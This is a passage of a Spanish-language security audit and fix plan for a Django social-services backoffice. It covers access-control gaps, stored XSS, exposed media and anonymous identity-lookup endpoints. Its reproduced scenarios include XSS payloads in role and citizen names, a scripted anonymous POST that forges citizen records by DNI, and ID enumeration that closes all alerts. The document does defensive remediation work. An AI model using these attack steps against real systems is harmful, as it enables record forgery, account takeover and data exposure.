- **Tests a agregar:** `configuracion/tests/test_programas_alcance.py::test_configurar_de_rol_becas_no_edita_dispositivos` (302/403), `::test_configurar_global_edita_cualquiera`; `users/tests/test_roles_abm.py::test_admin_becas_no_puede_tildar_programa_configurar`; `programas/tests/test_dispositivos_config.py` en verde.
- **Verificación:** V-STD + `manage.py test configuracion users programas.tests.test_dispositivos_config`. Pre-chequeo P-03.
- **Dependencias:** G1b-02 (autoasignación de `programa.configurar` por quien solo tiene `programa.rol.administrar`) va en el mismo PR. Riesgo: el Cambio 20 (`users.0019`) dio `programa.configurar` a roles que ya la tenían.

### SEC-08 · XSS almacenado por el nombre de un rol, en todas las páginas del backoffice
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC08XssRolTests`, 2 tests) · **Origen:** A5-08, V1-NEW-01 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #507 (Cambio 103), 01-oct-2026 — `base.html` recibe los grupos con `json_script` y el context processor dejó de exponer `user_groups_json`; tests en `core/tests/test_base_template_xss.py`. La whitelist opcional de `RolForm.clean_name` no se hizo (decisión registrada en el Cambio 103).
- **Ubicación:** `conversaciones/context_processors.py:24` (`str(groups).replace("'", '"')`); `templates/includes/base.html:372` (`window.userGroups = {{ user_groups_json|safe }};`); CSP con `'unsafe-inline'` (`config/middlewares/security_headers.py:38`).
- **Escenario (reproducido):** un rol `Op</script><script>alert(document.domain)</script>` se renderiza literal en `/inicio/`; un rol `Rol d'Ejemplo` produce `["Rol d"Ejemplo"]`, SyntaxError que aborta el `<script>` entero (incluido `window.conversacionesConfig`) en todas las páginas de sus usuarios. Pueden crear roles quienes tienen `rol.administrar` o `programa.rol.administrar`; `RolForm.clean_name` no restringe caracteres. Encadena con G2-03 (cambio de clave sin la actual).
- **Propuesta:** en `conversaciones/context_processors.py` borrar la clave `user_groups_json` (ya existe `user_groups_list`); en `base.html:372`:
  ```django
  {{ user_groups_list|json_script:"user-groups-data" }}
  <script>window.userGroups = JSON.parse(document.getElementById("user-groups-data").textContent);
  ```
  (y seguir con el resto del bloque). Consumidores: `static/custom/js/alertas_conversaciones*.js`, solo leen `window.userGroups`. Opcional: `RolForm.clean_name` con whitelist `^[\w\s().,/\-ÁÉÍÓÚÑáéíóúñ']+$`.
- **Tests a agregar:** `core/tests/test_base_template_xss.py::test_nombre_de_rol_no_rompe_script` (`</script><script>` no aparece literal) y `::test_apostrofe_en_nombre_de_rol` (el `json_script` contiene el apóstrofo escapado dentro de un JSON válido).
- **Verificación:** V-STD + V-UI.
- **Dependencias:** si G1-01 desmonta todo `conversaciones`, el context processor puede quedar; este fix es independiente.

### SEC-09 · `/media/`: nginx lo sirve sin login en DEV; en ECOM cualquier sesión (también la de un ciudadano) baja cualquier archivo
**Severidad:** ALTA en DEV, MEDIA en ECOM · **Estado:** CONFIRMADO-AJUSTADO (lectura de nginx + test `SEC09MediaTests` con `SERVE_MEDIA=True`) · **Origen:** A5-09, A2-12 · **Ola:** 0 (etapa 1) y 2 (etapa 2) · **Esfuerzo:** S + M · **Decisión:** D-09 (coordinación ECOM)

**Resolución:** 🟡 Parcial en #538 (Cambio 112), 03-oct-2026 — etapa 1 hecha en código: `nginx.conf` reemplaza los dos `location /media/` por `location /protected-media/` (`internal`, `attachment`, `nosniff`) y `/media/` cae en Django; `SERVE_MEDIA=True` para `web` en `docker-compose.prod.yml`; `PortalCiudadanoMiddleware` deja de eximir `/media/` (la sesión de un ciudadano ya no baja adjuntos, también en ECOM). Tests en `core/tests/test_media_protegida.py` (6). **Falta:** desplegarlo en icore-srv (R0b-11, operativo del PM: `web` antes que `nginx`; hasta entonces DEV sigue sirviendo `/media/` sin login) y la **etapa 2** (pertenencia por archivo, `X-Accel-Redirect`, `upload_to` con UUID), que sigue en la Ola 2, PR 7: hoy cualquier usuario de backoffice con sesión baja cualquier archivo. Seguimientos: R0b-07 (`/media/` abierto con `DEBUG=True`) y R0b-08 (comentarios viejos).
- **Ubicación:** `nginx.conf:62-65` y `:134-137` (`location /media/ { alias /media/; expires 7d; }`) → `docker-compose.prod.yml` → icore-srv (DEV `relevamiento-deshum.ecomdev.ar`); ECOM (`SERVE_MEDIA=True`): `config/urls.py:71-81` con `login_required(_media_serve)` sin pertenencia; `core/middleware.py:88` exime `/media/` para ciudadanos. Solo adjuntos y padrones de Becas usan UUID; `adjuntos/`, `ciudadanos/fotos/`, `admisiones/f00/` y `merenderos/solicitudes/%Y/%m/` conservan el nombre original.
- **Escenario:** con `SERVE_MEDIA=True`, anónimo → 302; ciudadano del portal (SEC-29) → **200** con el contenido. En DEV, por nginx, lo baja cualquiera sin sesión durante 7 días desde caché.
- **Propuesta:**
  - **Etapa 1 (Ola 0, DEV):** en `nginx.conf` reemplazar los dos bloques `/media/` por `location /protected-media/ { internal; alias /media/; add_header Content-Disposition attachment; add_header X-Content-Type-Options nosniff always; }` y dejar que `/media/` caiga en `location /` → Django; `SERVE_MEDIA=True` para `web` en `docker-compose.prod.yml`; quitar la exención de `/media/` en `core/middleware.py:88`. Reiniciar nginx (gotcha de IP cacheada).
  - **Etapa 2 (Ola 2):** `core/views/media.py::media_protegida(request, path)` que resuelve el dueño por prefijo: `adjuntos/` → `Adjunto` → `ciudadano.ver`; `admisiones/f00/` → `ArchivoAdmision` → `puede_operar_dispositivo`; `merenderos/solicitudes/` → `merendero.ver` con programa; `becas/…` → `_assert_scope_formulario`; `ciudadanos/fotos/` → `ciudadano.ver`; padrones → `es_admin_becas`. Con nginx responde `X-Accel-Redirect: /protected-media/<path>`; sin nginx, `FileResponse(..., as_attachment=True)`. Pasar a UUID los `upload_to` restantes (`legajos/models/base.py:57`, `:385`; `legajos/models/contactos.py:49`; `programas/models/__init__.py:878`, `:978`): migración de estado, los archivos existentes no se renombran.
- **Tests a agregar:** `core/tests/test_media_protegida.py`: `test_ciudadano_portal_no_descarga_media` (302 al perfil o 404 si el portal se apagó), `test_usuario_sin_capacidad_no_descarga_adjunto` (403), `test_con_capacidad_descarga_como_attachment`.
- **Verificación:** V-STD; en DEV, `curl -I https://relevamiento-deshum.ecomdev.ar/media/<ruta_conocida>` sin cookie → 302.
- **Dependencias:** Cambio 41 dejaba este pendiente de infraestructura; la app móvil **no** descarga `/media/` (verificado), así que `login_required` no la rompe. Mitigación de fondo para SEC-15.

### SEC-10 · Adjuntos de ciudadano y legajo: listar, subir y borrar sin capacidad ni pertenencia, con errores internos al cliente
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC10AdjuntosTests`) · **Origen:** A5-10, A3-03 (adjuntos), A3-17 (fuga de `str(exc)`) · **Ola:** 2 · **Esfuerzo:** S-M · **Decisión:** —
- **Ubicación:** `legajos/views/contactos_api.py:26-93` y `:182-188` (solo `@login_required`); `legajos/services/contactos.py:47-50` (`get_object_or_404(Adjunto, id=archivo_id).delete()` sin dueño); todos los `except Exception` devuelven `str(exc)` con 200.
- **Escenario (reproducido):** un usuario sin capacidades hace DELETE `/legajos/archivos/<id>/eliminar/` sobre un adjunto ajeno → `{"success": true}` y la fila se borra; el archivo físico queda huérfano.
- **Propuesta:** `@requiere("ciudadano.ver")` en `archivos_ciudadano_api` y `archivos_legajo_api`; `@requiere("ciudadano.editar")` en `subir_archivos_ciudadano`, `subir_archivos_legajo` y `eliminar_archivo`; ruta nueva `ciudadanos/<int:ciudadano_id>/archivos/<int:archivo_id>/eliminar/` (y la de legajo con uuid); servicio `eliminar_archivo_de_objeto(instance, archivo_id)` = `Adjunto.objects.get(content_type=ContentType.objects.get_for_model(type(instance)), object_id=instance.id, pk=archivo_id)` → `archivo.archivo.delete(save=False)` → `archivo.delete()`; ajustar el `fetch` de `ciudadano_detail.html`; reemplazar `str(exc)` por mensaje genérico + `logger.exception` y status 500 (dejar `ContactosFilesError` con 400). La robustez del listado (blob faltante, N+1) es LEG-04: mismo PR.
- **Tests a agregar:** `legajos/tests/test_adjuntos_rbac.py`: sin roles → 403 en listar, subir y eliminar; con `ciudadano.editar`, eliminar un adjunto de **otro** ciudadano → 404 y la fila sigue; error inesperado no expone el mensaje.
- **Verificación:** V-STD + V-UI (`ciudadano_detail.html` cambia).
- **Dependencias:** FE-02 (el mismo template usa `toastr`, que no está cargado: arreglar antes o junto para poder probar la subida).

### SEC-11 · APIs JSON de legajos (timeline, actividades, alertas, predicción de riesgo, evolución, historial) sin capacidad
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC11LegajosJsonTests`) · **Origen:** A5-11, A3-03 (parte no adjuntos) · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-11
- **Escenario (reproducido):** un usuario sin capacidades recibe 200 en `timeline`, `alertas`, `prediccion-riesgo` y `actividades`, con el tipo «Riesgo Suicida».
- **Propuesta:** `@requiere("ciudadano.ver")` en `actividades_ciudadano_api`, `evolucion_legajo_api` y `contactos_panel.historial_contactos_simple`; `@requiere("ciudadano.sensible")` en `timeline_ciudadano_api`, `alertas_ciudadano_api` y `prediccion_riesgo_api` (default D-11). `cerrar_alerta_api` → SEC-18.
- **Tests a agregar:** `legajos/tests/test_contactos_api_rbac.py`: test parametrizado por nombre de URL con usuario sin roles → 403 (con `X-Requested-With` el decorador devuelve JSON 403).
- **Verificación:** V-STD + `manage.py test legajos`.

### SEC-12 · Derivaciones: aceptar o rechazar por GET (CSRF) sin capacidad; inscripción directa por `is_staff`
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC12DerivacionGetTests`) · **Origen:** A5-12, A3-04, G1c-07 · **Ola:** 2 · **Esfuerzo:** S (reusando `ciudadano.editar`) / M (capacidad nueva) · **Decisión:** D-12
- **Escenario (reproducido):** GET `/legajos/derivaciones-ciudadano/<id>/aceptar/` sin capacidad → la derivación pasa a ACEPTADA y se crea una `InscripcionPrograma`.
- **Propuesta (default D-12 = reusar `ciudadano.editar`):** en `legajos/views/derivacion_programa.py`, `aceptar_derivacion_programa` y `rechazar_derivacion_programa` con `@require_POST` + `@requiere("ciudadano.editar")`; `derivar_programa_view` con `@requiere("ciudadano.editar")` y `puede_inscripcion_directa = rbac.puede(request.user, "ciudadano.editar")` en lugar de `is_staff`; template `legajos/programas/programa_detail.html:290` con form POST + `{% csrf_token %}` + confirmación (SweetAlert2 en Legajos, Cambio 48). Si D-12 = capacidad nueva: `("ciudadano.derivar", "Derivar e inscribir ciudadanos en programas")` en el módulo `ciudadanos` del `CATALOGO` + migración de datos que la dé a los roles con `ciudadano.editar`.
- **Tests a agregar:** `test_aceptar_derivacion_get_405`, `test_rechazar_sin_capacidad_403_y_sigue_pendiente`, `test_inscripcion_directa_sin_capacidad_no_se_ofrece`.
- **Verificación:** V-STD + V-UI. La bandeja hoy está vacía (LEG-06), así que no se rompe UI operativa.
- **Dependencias:** LEG-02 (reactivar inscripción) y LEG-06 (decisión de derivaciones).

### SEC-13 · Catálogo geográfico escribible por cualquier autenticado vía `/api/core/`
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC13GeoApiTests`) · **Origen:** A5-13 (absorbe A5-40) · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #541 (Cambio 115), 03-oct-2026 — `ProvinciaViewSet`, `MunicipioViewSet` y `LocalidadViewSet` pasan a `ReadOnlyModelViewSet`; los seis ViewSets de `core/api_views` (también `Sexo`, `Mes` y `Dia`, que ya eran de lectura) quedan con `[BackofficeAutenticado]`. Nadie escribía por `/api/core/` (el combo de domicilio usa `load_municipios`/`load_localidad`). Tests en `core/tests/test_api_geo.py` (escritura → 405 y las filas siguen; lectura 200; ciudadano del portal no lee).
- **Escenario (reproducido):** DELETE `/api/core/provincias/<id>/` sin capacidad → 204 (cascada a municipios y localidades). Con Basic de ciudadano, POST → 201. A5-40 (`static/custom/js/localidades_modal.js:45` pinta nombres con `innerHTML`) queda casi nulo al cerrar esto; el archivo además es JS huérfano (FE-14).
- **Propuesta:** en `core/api_views/__init__.py`, `ProvinciaViewSet`, `MunicipioViewSet` y `LocalidadViewSet` → `viewsets.ReadOnlyModelViewSet` (el ABM es web, `configuracion/views/geografia.py`, con `config.administrar`). Revisar que `SexoViewSet`, `MesViewSet` y `DiaViewSet` sean ReadOnly.
- **Tests a agregar:** `core/tests/test_api_geo.py::test_escritura_405` y `::test_lectura_autenticado_200`.
- **Verificación:** V-STD.

### SEC-14 · APIs del dashboard: enumeración del padrón por prefijo de DNI y alertas globales
**Severidad:** ALTA · **Estado:** CONFIRMADO con test (`SEC14DashboardApiTests`) · **Origen:** A5-14 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #541 (Cambio 115), 03-oct-2026 — las 5 vistas de `dashboard/api_views` llevan `BackofficeAutenticado` + capacidad: `buscar_ciudadanos` → `ciudadano.ver`; `alertas_criticas` y `actividad_reciente` → `ciudadano.sensible`, con las alertas resueltas por `FiltrosUsuarioService.obtener_alertas_usuario`; `metricas_dashboard` y `tendencias_datos` → `dashboard.ver`. En `inicio_view`, derivaciones solo con `ciudadano.ver` y conversaciones sin asignar solo con `conversacion.operar`; `templates/inicio.html` condiciona con `|puede` la tarjeta de tendencias y los feeds de «Mi trabajo de hoy» (desvío deliberado, registrado). Tests en `dashboard/tests/test_api_rbac.py` y `core/tests/test_inicio_rbac.py`. Seguimiento: R0b-09 (`actividad_reciente` mezcla inscripciones y derivaciones sin alcance bajo `ciudadano.sensible`).
- **Escenario (reproducido):** sin `ciudadano.ver`, GET `/api/buscar-ciudadanos/?q=301` → 200 con nombre y DNI (hasta 20 y `has_more`). G1b-05 (cuentas activas sin roles) lo agrava.
- **Propuesta (`dashboard/api_views/__init__.py`):** `buscar_ciudadanos` con `@permission_classes([BackofficeAutenticado, RequiereCapacidad("ciudadano.ver")])` (el buscador de `inicio.html:839` ya está dentro de `{% if user|puede:"ciudadano.ver" %}`); `alertas_criticas` y `actividad_reciente` con `ciudadano.sensible` y resolviendo las alertas con `FiltrosUsuarioService.obtener_alertas_usuario(request.user)`; `metricas_dashboard` y `tendencias_datos` con `dashboard.ver`. En `core/views/public.py` (`inicio_view`): `derivaciones_pendientes` solo si `puede(user, "ciudadano.ver")` y `conversaciones_sin_asignar` solo si `puede(user, "conversacion.operar")`.
- **Tests a agregar:** `dashboard/tests/test_api_rbac.py::test_buscar_ciudadanos_sin_capacidad_403` y `::test_con_ciudadano_ver_200`.
- **Verificación:** V-STD + `manage.py test dashboard core`.

### SEC-29 · Registro del portal: crea una cuenta sobre cualquier legajo existente con solo el DNI (puerta de entrada de SEC-01 y SEC-09)
**Severidad:** ALTA (sube desde BAJA) · **Estado:** CONFIRMADO con test (paso 1 de `SEC01BasicAuthTests`) · **Origen:** A5-41 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** D-29

**Resolución:** 🟡 Parcial en #511 (Cambio 102), 01-oct-2026 — `portal/urls.py` ya no publica `mi-perfil/*` (quedan `""`, `csrf/` y la inscripción por link); el middleware y `ciudadano_required` mandan a `portal:home`; comando nuevo `desactivar_usuarios_portal` (ensayo por defecto); tests en `portal/tests/test_portal_apagado.py`. Falta (operativo, PM): P-08 y `desactivar_usuarios_portal --aplicar` en PRD; no se corrió en ningún ambiente, así que las cuentas de ciudadano existentes siguen activas (ver SEC-09). Seguimiento: R0-02 (docs que nombran `portal:ciudadano_mi_perfil`).
- **Ubicación:** `portal/services/ciudadano_auth.py:56-64` (si existe un `Ciudadano` con ese DNI sin usuario, el flujo `legajo_existente` no consulta RENAPER ni verifica sexo); `portal/views/ciudadano_auth.py:66-132`; `portal/templates/portal/ciudadano/registro_step2.html:33-36`.
- **Escenario (reproducido):** step1 con DNI de un legajo existente → 302; step2 → 302 y queda logueado como dueño del legajo. Con cualquier DNI y sexo obtiene además el nombre completo de RENAPER.
- **Propuesta:** el portal está sin uso (decisión del PM, 29-sep-2026). En `portal/urls.py`, quitar todas las rutas `mi-perfil/*` y dejar `""`, `csrf/` e `inscripcion/<uuid:token>/…` (la inscripción pública **sí** queda). `core/middleware.py:91` redirige a `portal:ciudadano_mi_perfil`: cambiarlo a `portal:home`. Grep `{% url 'portal:ciudadano_` y `compile_templates.py` para que no quede ninguna referencia. Datos (default D-29): `User.objects.filter(groups__name="Ciudadanos").update(is_active=False)` en una migración de datos o un comando, después de contar con P-08.
- **Tests a agregar:** `portal/tests/test_portal_apagado.py::test_registro_no_existe` (`resolve("/portal/mi-perfil/registro/")` → 404) y `::test_inscripcion_publica_sigue`.
- **Verificación:** V-STD + V-UI + `manage.py test portal`.

### G1-01 · Chat público de conversaciones: cualquiera, sin login, crea el legajo de cualquier DNI con el nombre que quiera, y ese legajo después alimenta Becas y SIIS
**Severidad:** ALTA · **Estado:** CONFIRMADO (lectura) · **Origen:** G1-01; resuelve también A5-42 y A6-28 en su fase 2 · **Ola:** 0 (rutas públicas) / 7 (apagado completo) · **Esfuerzo:** S · **Decisión:** tomada (conversaciones sin uso, 29-sep-2026)

**Resolución:** 🟡 Parcial en #510 (Cambio 101), 01-oct-2026 — hecha la parte de la Ola 0: desmontadas `chat/`, `consultar-renaper/`, `iniciar/`, `<id>/enviar/` y `<id>/mensajes/`, y borrados `iniciar_conversacion_publica` (el `get_or_create` de legajos), sus forms y `chat_ciudadano.html`. Falta: la fase 2 (Ola 7); P-10 en PRD (operativo). `<id>/evaluar/` (R0-01) se desmontó en #537 (Cambio 111), 03-oct-2026: ya no queda escritura anónima en `conversaciones`.
- **Ubicación:** `conversaciones/urls.py:13` (`iniciar/`); `conversaciones/views/public.py:108-139` (sin login ni rate limit); `conversaciones/forms/chat.py:17-22` (`datos_renaper = forms.JSONField` que manda el cliente); `conversaciones/services/chat.py:33-55` (`Ciudadano.objects.get_or_create(dni=…, defaults={nombre: datos_renaper["nombre"], …})`). Consumidores del legajo: `programas/services/becas.py:260-279` (`resolver_ciudadano_offline` no pisa nombre ni apellido), `programas/services/padron.py:466-480` (solo completa vacíos), `programas/services/siis_envio.py:437-452` (el alta usa `ciudadano.nombre/apellido`).
- **Escenario:** un script toma la cookie CSRF de `/conversaciones/chat/` y hace `POST /conversaciones/iniciar/` con `{"tipo":"personal","dni":"45123456","sexo":"F","datos_renaper":{"nombre":"X","apellido":"Y"}}` para una lista de DNI. Cuando esas personas se inscriben, su caso se vincula a ese legajo; la validación por padrón o Gran Base marca el caso como validado pero no corrige el legajo (SIIS-08) y el alta a SIIS sale con el nombre falso (irreversible). Además deja una `Conversacion` activa por request.
- **Propuesta:**
  - **Ola 0:** desmontar las rutas públicas de `conversaciones` (`chat/`, `consultar-renaper/`, `iniciar/`, `<id>/enviar/`, `<id>/mensajes/`) en `conversaciones/urls.py`; como mínimo, borrar el `get_or_create` de `iniciar_conversacion_publica` (una conversación no crea legajos).
  - **Ola 7 (fase 2, A5-42/A6-28):** quitar los includes `conversaciones/` y `api/conversaciones/` de `config/urls.py` y, de `conversaciones/routing.py` (montado en `config/asgi.py`), las rutas `ws/conversaciones/…` y `ws/alertas-conversaciones/`; **conservar `ws/alertas/`** (`AlertasConsumer`, alertas de legajos del backoffice, asegurado en G1c-04: si se apaga, decidirlo aparte con H-10), limpiando en el mismo cambio las referencias `{% url 'conversaciones:…' %}` de `templates/includes/base.html:376-379`, las entradas del sidebar (`templates/includes/sidebar/opciones.html:153` «Dashboard Conversaciones» y `:386` «Cola Conversaciones»), la card de `inicio.html` y la solapa `tab-conversaciones` de `ciudadano_detail.html:743`.
  - **Datos:** auditar en PRD con P-10 (README §3).
- **Tests a agregar:** `conversaciones/tests/test_public.py::test_iniciar_publico_desmontado` (POST anónimo con `datos_renaper` → 404 y `Ciudadano.objects.filter(dni=…).exists()` False).
- **Verificación:** V-STD + V-UI (fase 2).
- **Dependencias:** G1-02 en el mismo PR.

### G1-02 · Segundo oráculo RENAPER anónimo: `/conversaciones/consultar-renaper/` devuelve nombre, apellido, nacimiento y domicilio de cualquier DNI
**Severidad:** ALTA · **Estado:** CONFIRMADO (lectura) · **Origen:** G1-02 · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** tomada (conversaciones sin uso)

**Resolución:** ✅ Resuelto en #510 (Cambio 101), 01-oct-2026 — `consultar-renaper/` desmontada; se borraron la vista `consultar_renaper`, el servicio `consultar_renaper_para_chat` y `RenaperConsultaForm`; test en `conversaciones/tests/test_public.py`.
- **Ubicación:** `conversaciones/urls.py:12`; `conversaciones/views/public.py:45-105` (sin login; `rate_limit_excedido(..., limite=10, ventana_segundos=60)` por IP real vía `ip_cliente`); `conversaciones/services/chat.py:27-30` → `legajos.services.consulta_renaper.consultar_datos_renaper`. La respuesta incluye `"domicilio"` y distingue «fallecido».
- **Escenario:** mismo patrón que SEC-04 por otra puerta; 10/min por IP se multiplica con cualquier pool de IPs. **Si se cierra solo SEC-04, este queda abierto.**
- **Propuesta:** desmontarlo junto con G1-01. Si algún día se reactiva el chat, la consulta debe devolver solo «coincide / no coincide» contra lo que la persona tipeó, nunca el domicilio.
- **Tests a agregar:** `POST /conversaciones/consultar-renaper/` anónimo → 404, con `mock` de `consultar_datos_renaper` y `assert_not_called`.
- **Verificación:** V-STD.

## MEDIA

### SEC-15 · Uploads de F-00 y de solicitud de merendero sin lista blanca de tipo ni techo de tamaño
**Severidad:** MEDIA (A3-08 era ALTA y A5-29 BAJA) · **Estado:** CONFIRMADO-AJUSTADO con test (`SEC15UploadsTests`) · **Origen:** A3-08, A5-29 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-15
- **Ubicación:** `programas/forms.py:818-819` (`F00DinamicoForm`, `forms.FileField` sin validadores); `SolicitudMerenderoForm`; modelos `programas/models/__init__.py:878`, `:977-980`. Requiere usuario interno con `dispositivo.admitir` o `merendero.crear`. El XSS se sirve same-origin en DEV (nginx) y también en ECOM (`django.views.static.serve` infiere `text/html` para `.html` y no manda `attachment`).
- **Escenario (reproducido):** `SolicitudMerenderoForm` con `documentacion=x.html` → válido.
- **Propuesta:** `core/validators.py::validar_adjunto(archivo, extensiones=ADJUNTO_EXTENSIONES, max_bytes=ADJUNTO_MAX_BYTES)`, reusando las constantes del Cambio 46 que hoy viven en la API de campo; lista blanca `.pdf .jpg .jpeg .png .heic .webp` (default D-15: sin `.doc/.docx`) y firma por magic bytes para pdf, png y jpg. Aplicarlo en `ArchivoAdmision.archivo`, `SolicitudMerendero.documentacion` y `HistorialContacto.archivo_adjunto` (`validators=[...]`, migración sin cambio de esquema) y en `F00DinamicoForm` para `TipoCampo.ARCHIVO`. La mitigación de fondo es SEC-09 (`attachment` + `nosniff`).
- **Tests a agregar:** `programas/tests/test_uploads_whitelist.py`: `test_merendero_rechaza_html`, `test_f00_rechaza_svg`, `test_archivo_mayor_al_tope_rechazado`.
- **Verificación:** V-STD.

### SEC-16 · `/api/users/users/` y `/api/users/groups/<id>/users/` listan el personal con DNI, teléfono e `is_superuser`
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`SEC16UsersApiListTests`) · **Origen:** A5-16 (+ `GroupViewSet.users`, `users/api_views/__init__.py:159-169`) · **Ola:** 0 · **Esfuerzo:** incluido en SEC-05 · **Decisión:** D-05

**Resolución:** ✅ Resuelto en #540 (Cambio 113), 03-oct-2026, con SEC-05 — `/api/users/users/` y `/api/users/groups/<id>/users/` ya no existen (404); `me` solo devuelve al propio usuario. PoC `SEC16UsersApiListTests` invertida en `users/tests/test_api_rbac.py`.
- **Escenario (reproducido):** usuario plano, GET `?is_staff=true` → 200 con `is_superuser` (también `?groups=<id Administrador>`).
- **Propuesta:** la de SEC-05 (apagar la API salvo `me`). Si se conserva: list/retrieve con `CAPS_ENTRADA_ABM_USUARIOS` y `get_queryset = usuarios_visibles_para(self.request.user)`, y sacar `dni` y `observacion` de `ProfileSerializer` anidado en `UserSerializer`.
- **Tests a agregar:** `test_list_sin_capacidad_403` (o 404 si se apaga) y `test_me_200`.

### SEC-17 · La API REST de usuarios y roles saltea las reglas del ABM web
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`SEC17RenombrarCiudadanosTests`) · **Origen:** A5-17 · **Ola:** 0 · **Esfuerzo:** incluido en SEC-05 (apagar) / M (conservar) · **Decisión:** D-05

**Resolución:** ✅ Resuelto en #540 (Cambio 113), 03-oct-2026, con SEC-05 (camino «apagar» de D-05) — no queda escritura de usuarios ni roles por API: el PATCH del rol protegido `Ciudadanos`, el alta y la asignación de roles inactivos dan 404. PoC `SEC17RenombrarCiudadanosTests` invertida.
- **Escenario (reproducido):** con `rol.administrar`, PATCH `/api/users/groups/<Ciudadanos>/ {"name": "Ciudadanos2"}` → 200 aunque `protegido=True`; `es_ciudadano_portal` resuelve por nombre (`rbac.py:628`), así que los ciudadanos dejan de detectarse y **entran al backoffice**. Además `groups = PrimaryKeyRelatedField(queryset=Group.objects.all())` asigna roles inactivos, y no se llama a `asegurar_admin_restante` ni a `validate_password`.
- **Propuesta:** apagar la escritura (SEC-05). Si se conserva: `update`/`partial_update` de `GroupViewSet` → 400 si `meta.protegido`; serializers de usuario validan `groups` contra `_roles_asignables_queryset(operador)` y corren `asegurar_admin_restante` en `transaction.atomic`.
- **Tests a agregar:** `test_patch_rol_protegido_400`, `test_patch_usuario_que_deja_sin_admin_400` (o 404 si se apaga).

### SEC-18 · Alertas: cerrar cualquiera por id; las CRÍTICAS de todo el sistema visibles para quien no tiene legajos
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`SEC11…alertas_dashboard`; `test_repro_dispositivos_legajos.py::A313A314`) · **Origen:** A5-18, A3-13 (= LEG-07), G1c-05, G1c-06 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-18

**⚠ Actualizar (03-oct-2026):** `AlertasViewSet` hoy en `legajos/api_views/__init__.py:65` y `cerrar` en `:95` (`AlertasService.cerrar_alerta(pk, request.user)`, todavía sin `get_object()`). #542 (Cambio 114) le sumó `BackofficeAutenticado`, pero sigue sin capacidad (`[BackofficeAutenticado, IsAuthenticated]`): decidirla en este PR (R0b-06).
- **Ubicación:** `legajos/services/filtros_usuario.py:31-33` (sin legajos propios, `filtros = Q(prioridad="CRITICA")`); `legajos/services/alertas.py:206-218` (`cerrar_alerta` con `AlertaCiudadano.objects.get(id=…)`); entradas `cerrar_alerta_api`, `cerrar_alerta_ajax` (`legajos/views/contactos_api.py:123-135`, `legajos/views/alertas.py:64-71`) y `AlertasViewSet.cerrar` (`legajos/api_views/__init__.py:84-93`, `detail=True` sin `get_object()`); `legajos/views/alertas.py:11,74,91` solo `login_required`.
- **Escenario (reproducido):** un usuario sin roles ni legajos ve «riesgo» en `/legajos/alertas/`; `POST /legajos/alertas/<n>/cerrar-ajax/` con n = 1..N silencia todas las alertas del sistema.
- **Propuesta:** en el fallback, `return AlertaCiudadano.objects.none()` (o `Q(pk__in=[])`); `cerrar_alerta(alerta_id, usuario)` → `FiltrosUsuarioService.obtener_alertas_usuario(usuario).get(id=alerta_id)` (si no existe, False); `AlertasViewSet.cerrar` usa `self.get_object()`; `@requiere("ciudadano.ver")` en `alertas_dashboard`, `alertas_count_ajax`, `alertas_preview_ajax` y `cerrar_alerta_ajax`. Default D-18: aceptar que el badge quede en 0 para quien hoy ve CRÍTICAS globales (las globales las ve `config.administrar`, ya previsto en `filtros_usuario.py:20-21`).
- **Tests a agregar:** `test_usuario_sin_legajos_no_ve_criticas`, `test_cerrar_alerta_fuera_de_alcance_no_la_cierra`, `test_api_cerrar_usa_get_object_404`.
- **Verificación:** V-STD + `manage.py test legajos`.
- **Dependencias:** G1c-04 (el WS difunde lo mismo sin alcance): mismo PR o seguido.

### SEC-19 · XSS almacenado en `/legajos/alertas/debug/` y rutas de prueba publicadas
**Severidad:** MEDIA · **Estado:** CONFIRMADO con test (`SEC18DebugXssTests`; `A313A314`) · **Origen:** A5-19, A3-14 (= LEG-08), A6-16 (= FE-15) · **Ola:** 0 · **Esfuerzo:** S · **Decisión:** —

**Resolución:** ✅ Resuelto en #537 (Cambio 111), 03-oct-2026 — desmontadas `alertas/debug/`, `alertas/test/`, `test-contactos/` y `test-api/` (las cuatro → 404) y borradas `debug_alertas`, `test_alertas_page` y `test_api`. No hubo templates que borrar: `legajos/test_alertas.html` ya no existía (de ahí el 500) y `dashboard_simple.html` se conserva porque lo usa `dashboard-contactos/`. Test en `legajos/tests/test_rutas_debug.py`.
- **Ubicación:** `legajos/views/alertas.py:118-203` (sink en `:171`: `f"<li>… {alerta.ciudadano.nombre_completo}: {alerta.mensaje}</li>"` en `HttpResponse`; también entran sin escapar `request.user.username` y los nombres de grupo); rutas `legajos/urls/__init__.py:52-53`, `:99-100`.
- **Escenario (reproducido):** un ciudadano con nombre `<img src=x onerror=alert(1)>` y una alerta CRÍTICA hacen que `/legajos/alertas/debug/` lo devuelva literal a un usuario sin roles. En navegador (V5a): `/legajos/test-contactos/` 200 con `main` vacío, `/legajos/alertas/test/` 500, `/legajos/alertas/debug/` y `/legajos/test-api/` 200.
- **Propuesta:** borrar las rutas `alertas/debug/`, `alertas/test/`, `test-contactos/` y `test-api/` de `legajos/urls/__init__.py`, y las vistas `debug_alertas`, `test_alertas_page` (`legajos/views/alertas.py:118-203`) y `test_api` (`dashboard_simple.py`) con sus templates. El resto del código muerto de Legajos va en LEG-06.
- **Tests a agregar:** `legajos/tests/test_rutas_debug.py::test_rutas_de_debug_no_existen` (`reverse` → `NoReverseMatch` para los 4 nombres).
- **Verificación:** V-STD + V-UI (`compile_templates.py`).

### SEC-20 · Inyección de fórmulas en CSV/XLSX (exports legacy de convocatoria y padrón completo de ciudadanos)
**Severidad:** MEDIA · **Estado:** CONFIRMADO (lectura) · **Origen:** A5-20, G3-01 · **Ola:** 2 · **Esfuerzo:** S · **Decisión:** D-20 (capacidad de exportación)
